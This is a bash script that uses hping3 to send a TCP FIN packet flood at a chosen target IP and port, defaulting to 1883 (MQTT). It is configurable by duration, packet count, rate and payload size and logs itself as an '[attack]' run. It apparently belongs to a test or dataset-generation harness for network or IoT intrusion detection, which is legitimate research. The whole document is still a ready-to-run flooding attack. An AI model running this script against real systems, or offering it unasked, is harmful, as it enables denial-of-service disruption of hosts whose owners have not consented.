#!/usr/bin/env bash
set -euo pipefail
TARGET="${1:-${TARGET_IP:-}}"
PORT="${2:-${TARGET_PORT:-1883}}"
: "${TARGET:?target IP/FQDN required}"
DURATION_S="${DURATION_S:-5}"
COUNT="${COUNT:-200}"
RATE_PPS="${RATE_PPS:-50}"
PAYLOAD_SIZE="${PAYLOAD_SIZE:-64}"
echo "[attack] fin_flood target=${TARGET}:${PORT} duration_s=${DURATION_S} count=${COUNT} rate_pps=${RATE_PPS} payload_size=${PAYLOAD_SIZE}"
cmd=(hping3 -F)
cmd+=(-p "${PORT}")
if [ "${PAYLOAD_SIZE}" -gt 0 ]; then cmd+=(-d "${PAYLOAD_SIZE}"); fi
if [ "${COUNT}" -gt 0 ]; then cmd+=(-c "${COUNT}"); fi
if [ "${RATE_PPS}" -gt 0 ]; then interval_us=$((1000000 / RATE_PPS)); if [ "${interval_us}" -lt 1 ]; then interval_us=1; fi; cmd+=(-i "u${interval_us}"); fi
cmd+=("${TARGET}")
timeout "${DURATION_S}" "${cmd[@]}" || true
echo "[attack] fin_flood completed"
